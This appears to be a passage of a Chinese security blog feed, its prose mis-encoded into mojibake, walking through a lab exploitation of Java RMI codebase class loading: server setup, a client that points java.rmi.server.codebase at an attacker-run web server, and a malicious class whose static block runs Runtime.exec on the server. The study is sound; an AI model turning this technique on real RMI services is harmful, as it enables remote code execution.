<p>åœ¨RMIä¸­ï¼Œcodebaseå¯ä»¥éšç€åºåˆ—åŒ–æ•°æ®ä¸€èµ·ä¼ è¾“ï¼ŒæœåŠ¡ç«¯æ¥æ”¶åˆ°è¿™ä¸ªæ•°æ®åï¼Œå°±å…ˆåœ¨CLASSPATHä¸­å¯»æ‰¾ï¼Œç„¶åå»æŒ‡å®šçš„codebaseå¯»æ‰¾ç±»ã€‚æœ€åå°±å¯èƒ½è¢«<code>codebase</code>æŒ‡å‘çš„æ¶æ„ç±»æ§åˆ¶å¯¼è‡´è¢«getshellæˆ–è€…ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p>
</blockquote>
<h3 id="ç¯å¢ƒé…ç½®å’Œä»£ç ç¼–å†™"><a href="#ç¯å¢ƒé…ç½®å’Œä»£ç ç¼–å†™" class="headerlink" title="ç¯å¢ƒé…ç½®å’Œä»£ç ç¼–å†™"></a>ç¯å¢ƒé…ç½®å’Œä»£ç ç¼–å†™</h3><p>ç¯å¢ƒé…ç½®ï¼Œåªæœ‰æ»¡è¶³å¦‚ä¸‹æ¡ä»¶çš„RMIæœåŠ¡å™¨æ‰èƒ½è¢«æ”»å‡»</p>
<blockquote>
<ul>
<li><p>å®‰è£…å¹¶é…ç½®äº†SecurityManager </p>
</li>
<li><p>Javaç‰ˆæœ¬ä½äº<code>7u21</code>ã€<code>6u45</code>ï¼Œæˆ–è€…è®¾ç½®äº† <code>java.rmi.server.useCodebaseOnly=false</code></p>
</li>
</ul>
</blockquote>
<blockquote>
<p>å…¶ä¸­ <code>java.rmi.server.useCodebaseOnly</code> æ˜¯åœ¨<code>Java 7u21</code>ã€<code>6u45</code>çš„æ—¶å€™ä¿®æ”¹çš„ä¸€ä¸ªé»˜è®¤è®¾ç½®ï¼š </p>
<ul>
<li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a> </li>
<li><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
</ul>
</blockquote>
<p>æˆ‘çš„ç¯å¢ƒ</p>
<blockquote>
<p>é…ç½®ç¯å¢ƒçŠ¯äº†ä¸ªä½çº§é”™è¯¯ï¼Œå®¢æˆ·ç«¯çš„javaç‰ˆæœ¬å¤ªé«˜ï¼Œç¼–è¯‘å‡ºæ¥çš„ç±»æ–‡ä»¶æ— æ³•è¢«æœåŠ¡å™¨çš„ä½ç‰ˆæœ¬javaè™šæ‹ŸæœºåŠ è½½ï¼Œå¯¼è‡´codebaseæŒ‡å‘çš„æ¶æ„ç±»æ— æ³•è¢«æ­£ç¡®åŠ è½½</p>
</blockquote>
<blockquote>
<p>æœåŠ¡ç«¯ï¼š</p>
<ul>
<li>ip: <code>192.168.169.136</code></li>
<li><code>java 17.5</code></li>
</ul>
<p>å®¢æˆ·ç«¯ï¼š</p>
<ul>
<li>ip: <code>192.168.169.1</code></li>
<li><code>java 17.0.5</code></li>
</ul>
</blockquote>
<p>æœåŠ¡ç«¯çš„å››ä¸ªæ–‡ä»¶ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteRMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åç¼–è¯‘ä¸‰ä¸ªjavaæ–‡ä»¶ï¼Œå¹¶è¿è¡ŒæœåŠ¡ç«¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac *</span><br><span class="line"></span><br><span class="line">java -Djava.rmi.server.hostname=192.168.169.136 -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=client.policy -<span class="built_in">cp</span> E:\Java_Study\src\main\java RMI_2.RemoteRMIServer</span><br></pre></td></tr></table></figure>

<blockquote>
<p>*æ³¨æ„ï¼Œç¬¬äºŒæ®µå‘½ä»¤æˆ‘æ˜¯åœ¨<code>cmd</code>ä¸­è¿è¡Œï¼Œå¦‚æœåœ¨<code>powershell</code>ä¸­è¿è¡Œéœ€è¦æŠŠ-Då’Œjavaç”¨å¼•å·åˆ†å¼€ï¼Œå¦‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -D<span class="string">&quot;java.rmi.server.hostname=192.168.169.136&quot;</span> -D<span class="string">&quot;java.rmi.server.useCodebaseOnly=false&quot;</span> -D<span class="string">&quot;java.security.policy=client.policy&quot;</span> -<span class="built_in">cp</span> E:\Java_Study\src\main\java RMI_2.RemoteRMIServer</span><br></pre></td></tr></table></figure>
</blockquote>
<p>æ‰§è¡Œåå¦‚ä¸‹å›¾ï¼Œ<code>client.policy</code>æ–‡ä»¶ç”¨äºé…ç½®åè®®å…³é—­<code>java.security</code>ï¼Œ</p>
<p>æ‰§è¡Œæ—¶åŠ ä¸Š<code>java.rmi.server.useCodebaseOnly=false</code>å…è®¸æœåŠ¡ç«¯ä»RMIè¯·æ±‚ä¸­è·å–åŠ è½½<code>codebase</code>ï¼Œè‹¥ä¸º<code>true</code>åˆ™javaè™šæ‹Ÿæœºå°†åªä¿¡ä»»é¢„å…ˆé…ç½®å¥½çš„<code>codebase</code>ã€‚</p>
<p><code>java.rmi.server.hostname=192.168.168.131</code>ä¸ºæœåŠ¡ç«¯<code>ip</code>ï¼Œä¹Ÿæ˜¯å®¢æˆ·ç«¯è¦è®¿é—®çš„<code>ip</code></p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014155150325.png" alt="image-20231014155150325"></p>
<p>ç„¶åç¼–å†™å®¢æˆ·ç«¯ï¼Œæ ¹æ®æœåŠ¡ç«¯æ–‡ä»¶çš„ä»£ç ï¼ŒæŒ‡å®šè¿™æ˜¯ä¸€ä¸ªè¿ç®—åŠ æ³•çš„æœåŠ¡ç«¯ï¼Œç„¶åè¿˜æœ‰ä¸ª<code>ICalc</code>æ¥å£æ–‡ä»¶ï¼Œå°†å…¶å’Œå®¢æˆ·ç«¯æ–‡ä»¶ä¸€ä¸ªç›®å½•ä¸‹ã€‚</p>
<p>å®¢æˆ·ç«¯ä»£ç ã€pç¥çš„ä»£ç ç¨å¾®åœ¨æˆ‘ç¯å¢ƒä¸‹æœ‰ç‚¹é”™è¯¯ã€‘</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014162311620.png" alt="image-20231014162311620"></p>
<p><u>ä¸»è¦æ˜¯å…¶ä¸­<code>Payload</code>è¿™ä¸ªå†…éƒ¨ç±»æŠ¥é”™ï¼Œå› ä¸ºåœ¨RMIä¸­ç±»æ˜¯åºåˆ—åŒ–ä¼ é€’çš„ï¼Œå¦‚æœå†…éƒ¨ç±»è¦è¢«åºåˆ—åŒ–ä¼ é€’ï¼Œå®ƒå¿…é¡»æ˜¯<code>static</code>çš„ï¼Œå¦åˆ™ä¼šå¯¼è‡´åºåˆ—åŒ–é—®é¢˜ã€‚</u></p>
<blockquote>
<p><code>å†…éƒ¨ç±»ä¸èƒ½è¢«åºåˆ—åŒ–ï¼</code></p>
</blockquote>
<p>çœ‹åˆ°å®ƒæ˜¯ç»§æ‰¿<code>ArrayList</code>ï¼Œç›´æ¥ç”¨<code>ArrayList</code>å³å¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">-   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">-   &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://192.168.169.136:1099/refObj&quot;</span>);</span><br><span class="line">-       List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">+       List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸è¿è¡Œï¼Œå‘é€åˆ°æœåŠ¡ç«¯ï¼Œè¿”å›<code>3ï¼Œ4</code>ç›¸åŠ åçš„ç»“æœ<code>7</code></p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014162928158.png" alt="image-20231014162928158"></p>
<h3 id="æŒ‡å®šcodebase"><a href="#æŒ‡å®šcodebase" class="headerlink" title="æŒ‡å®šcodebase"></a>æŒ‡å®š<code>codebase</code></h3><p>å®¢æˆ·ç«¯å†åœ¨<code>RMI</code>ä¸­æŒ‡å®š<code>codebase</code>ï¼Œå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.rmi.server.codebase=http:<span class="comment">//example.com/ -cp E:\Ttoc\Desktop\JAVA\JAVA_Study\src\main\java RMIClient.java</span></span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯å…ˆå‘è¿œç¨‹å¯¹è±¡å‘é€codebaseï¼Œå¹¶å‘Šè¯‰äº†æŸ¥è¯¢çš„ç±»åç§°</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017210721617.png" alt="image-20231017210721617"></p>
<p>å‘ç°æœç„¶æœåŠ¡ç«¯é€šè¿‡å®¢æˆ·ç«¯å‘é€çš„<code>codebase</code>ä¿¡æ¯ï¼Œåˆ°ç›®æ ‡ç½‘ç«™ä¸‹è¿›è¡Œå¯»æ‰¾è®¿é—®ç±»ï¼Œ<code>User-Agent</code>å°±æ˜¯æœåŠ¡ç«¯çš„javaè™šæ‹Ÿæœºã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014165043675.png" alt="image-20231014165043675"></p>
<p>æœ€å<code>example.com</code>å“åº”è¿”å›404</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014165505720.png" alt="image-20231014165505720"></p>
<p>å½“ç„¶è¿™é‡Œå¦‚æœä»£ç å’Œpç¥ä¸€æ ·ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿˜å¯ä»¥çœ‹åˆ°æœåŠ¡ç«¯ä¹ŸæŸ¥æ‰¾äº†å†…éƒ¨ç±»<code>RMIClient$Payload</code>ï¼Œåªä¸è¿‡å®¢æˆ·ç«¯æœ€åè¾“å‡ºä¼šæŠ¥é”™ï¼Œä½†æ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æˆåŠŸæŠŠ<code>codebase</code>å‘é€ç»™äº†æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯ä¹Ÿåœ¨åº•ä¸‹å¯»æ‰¾å†…éƒ¨ç±»</p>
<blockquote>
<p>å¯ä»¥ä»ä¸‹æ–¹è¿”å›çš„æ•°æ®åŒ…çš„é¡ºåºï¼ŒçŸ¥é“æœåŠ¡å™¨å…ˆå¯»æ‰¾å†…éƒ¨ç±»ï¼Œå†å¯»æ‰¾å¤–éƒ¨ç±»</p>
</blockquote>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014171626991.png" alt="image-20231014171626991"></p>
<h3 id="åŠ è½½æ¶æ„ç±»"><a href="#åŠ è½½æ¶æ„ç±»" class="headerlink" title="åŠ è½½æ¶æ„ç±»"></a>åŠ è½½æ¶æ„ç±»</h3><p>ä¸Šé¢çš„æµé‡åˆ†æçŸ¥é“æœåŠ¡ç«¯çš„<code>java</code>è™šæ‹Ÿæœºç¡®å®ä¼šè®¿é—®<code>codebase</code>çš„ç±»æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠ<code>/RMIClient$Payload.class</code> æ”¹æˆæ¶æ„ç±»å³å¯ï¼Œå½“ç„¶åœ¨<code>RMIClient</code>ä¸­å†™ä¸Šæ¶æ„ç±»ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œä»¥åœ¨å†…éƒ¨ç±»Payloadä¸ºä¾‹å­</p>
<p>åŠ ä¸Šæ¶æ„ç±»åçš„ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                <span class="type">String</span> <span class="variable">commands</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">                p.waitFor();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://192.168.169.146:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‡æ–°ç¼–è¯‘ç”Ÿæˆç±»æ–‡ä»¶</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">javac</span> <span class="regexp">*.java</span></span><br></pre></td></tr></table></figure>

<hr>
<blockquote>
<p>è¿™é‡Œé‡åˆ°ä¸€ä¸ªå‘ï¼Œå› ä¸º<code>Payload</code>æ˜¯å†…éƒ¨ç±»ï¼Œå…¶æœ¬è´¨è¿˜æ˜¯ä¸º<code>RMIClient$Payload</code></p>
<p>è€Œè¿™é‡Œï¼Œæˆ‘å°†æ¶æ„ç±»å†™åœ¨äº†å†…éƒ¨ç±»ä¸­ï¼Œæ‰€ä»¥æœ€åæœåŠ¡ç«¯è¦æ‰§è¡Œå†…éƒ¨ç±»çš„é™æ€æ–¹æ³•ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„æ¶æ„æ–¹æ³•ï¼Œè¿˜éœ€è¦åŠ è½½å¤–éƒ¨ç±»<code>RMIClient</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†å†…éƒ¨ç±»<code>RMIClient$Payload</code>å’Œå¤–éƒ¨ç±»<code>RMIClient</code>éƒ½æ”¾åœ¨æ¶æ„æœåŠ¡å™¨ç­‰ç€æœåŠ¡ç«¯åŠ è½½</p>
<p>å¦‚æœå°†æ¶æ„æ–¹æ³•å†™åœ¨å¤–éƒ¨ç±»ä¸­ï¼Œå°±åªæœ‰æŠŠå¤–éƒ¨ç±»<code>RMIClient</code>æ”¾åœ¨æ¶æ„æœåŠ¡å™¨ä¸Šç­‰ç€æœåŠ¡ç«¯åŠ è½½å°±å¯ä»¥æ‰§è¡Œ</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="type">String</span> <span class="variable">commands</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://192.168.169.146:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>å› ä¸ºæœåŠ¡ç«¯æ˜¯è™šæ‹Ÿæœºä¸­è¿è¡Œï¼Œæˆ‘ç›´æ¥åœ¨ç‰©ç†æœºç”¨<code>wsl</code>å®‰è£…<code>apache2</code>ä¸ŠæŠŠè¿™ä¸¤ä¸ªç±»æ–‡ä»¶æ”¾ä¸Šå»(ä¸ºä»€ä¹ˆæ”¾ä¸¤ä¸ªç±»ï¼ŒåŸå› è§ä¸Š)</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017222948310.png" alt="image-20231017222948310"></p>
<p>è®°å¾—ç›®å½•å¿…é¡»æŒ‰ç…§æ ¼å¼éœ€è¦ä¸ºåŒ…å</p>
<p>ä¿®æ”¹ä¸Šé¢çš„<code>example.com</code>ä¸º<code>wsl</code>çš„<code>ip</code>å³å¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.rmi.server.codebase=http:<span class="comment">//x.x.x.x/ -cp E:\Ttoc\Desktop\JAVA\JAVA_Study\src\main\java RMIClient.java</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è®¿é—®æˆåŠŸï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017223047942.png" alt="image-20231017223047942"></p>
<p>ç½‘ç«™ä¹Ÿå°†ç±»çš„å†…å®¹è¿”å›ç»™java-vm</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017213458878.png" alt="image-20231017213458878"></p>
<p>æŸ¥çœ‹æœåŠ¡ç«¯</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017223143987.png" alt="image-20231017223143987"></p>
<p>æ‰§è¡ŒæˆåŠŸ</p>
<hr>
<p>*æ³¨æ„ï¼Œè¿›è¡ŒRMIæ—¶ï¼Œå®¢æˆ·ç«¯æ¥å£æ–‡ä»¶çš„åŒ…åå¿…é¡»å’ŒæœåŠ¡å™¨åŒ…åå¿…é¡»ä¸€æ ·</p>
<p>å¦‚ä¸‹ï¼Œåœ¨<code>RMI_2</code>åŒ…ä¸­ï¼Œæˆ‘çš„æ¥å£æ–‡ä»¶çš„åŒ…åä¹Ÿæ˜¯<code>RMI_2</code>ï¼Œä½†æ˜¯æœåŠ¡ç«¯çš„æ¥å£æ–‡ä»¶åŒ…åæ˜¯<code>RMI_1</code></p>
<p>å®¢æˆ·ç«¯ï¼š</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193958356.png" alt="image-20230921193958356"></p>
<p>æœåŠ¡ç«¯ï¼š</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193926761.png" alt="image-20230921193926761"></p>
<p>æŠ¥é”™ï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193717284.png" alt="image-20230921193717284"></p>
<blockquote>
<p>è¿™ä¸ªå¼‚å¸¸æ˜¯ç”±äºJavaæ¨¡å—åŒ–ç³»ç»Ÿå¼•å…¥çš„ã€‚åœ¨Java 9åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼Œå¼•å…¥äº†æ¨¡å—åŒ–ç³»ç»Ÿï¼Œå®ƒä¼šå¯¹ç±»åŠ è½½å’Œæ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»è¿›è¡Œæ›´ä¸¥æ ¼çš„æ§åˆ¶ã€‚è¿™ä¸ªå¼‚å¸¸æ¶ˆæ¯è¡¨æ˜ä½ <code>æ­£åœ¨å°è¯•å°†ä¸€ä¸ªæ¥å£ä»ä¸€ä¸ªæ¨¡å—åŠ è½½åˆ°å¦ä¸€ä¸ªæ¨¡å—</code>ï¼Œè€Œä¸¤è€…ä¹‹é—´å¯èƒ½å­˜åœ¨è®¿é—®é™åˆ¶ã€‚</p>
<p>è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•ä¹‹ä¸€æ˜¯<code>ç¡®ä¿ä½ çš„RMIæ¥å£å’Œå®ç°éƒ½åœ¨ç›¸åŒçš„æ¨¡å—ä¸­</code>ï¼Œæˆ–è€…åœ¨ç›¸åŒçš„æ¨¡å—è·¯å¾„ä¸‹ã€‚è¿™æ ·ï¼Œå®ƒä»¬å°†å±äºåŒä¸€æ¨¡å—ï¼Œä¸ä¼šå‡ºç°æ¨¡å—ä¹‹é—´çš„è®¿é—®é—®é¢˜ã€‚</p>
</blockquote>
<p>æ‰€ä»¥ï¼Œåªå®¢æˆ·ç«¯åªéœ€è¦å¯¼å…¥<code>RMI_1</code>åŒ…ä¸­çš„æ¥å£ï¼Œå°±å¯ä»¥æˆåŠŸè®¿é—®åˆ°æœåŠ¡ç«¯ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921194236577.png" alt="image-20230921194236577"></p>
<hr>
]]></content>
      <categories>
        <category>Javaæ¼«è°ˆå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaå®‰å…¨[RMI(3)]</title>
    <url>//post/Java%E5%AE%89%E5%85%A8%5BRMI(3)%5D/</url>
    <content><![CDATA[<p><code>RMI2</code>ä¸­æˆåŠŸå®ç°äº†codebaseè¿›è¡ŒåŠ è½½æ¶æ„ç±»ï¼Œä½†æ˜¯åœ¨å®é™…ç¯å¢ƒç¡®å®éš¾å®ç°ç¬¦åˆç¯å¢ƒï¼Œæ‰€ä»¥åªä½œä¸ºä¸€ä¸ªäº†è§£å’Œè®¤è¯†ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ä¸»è¦åˆ†æcodebaseæ˜¯å¦‚ä½•åœ¨RMIä¸­è¿›è¡Œä¼ é€’çš„ï¼Œä»¥åŠå¯¹åˆ†æJavaåºåˆ—åŒ–æ•°æ®çš„å·¥å…·<code>SerializationDumper</code>çš„ä½¿ç”¨ä»‹ç»</p>
<span id="more"></span>

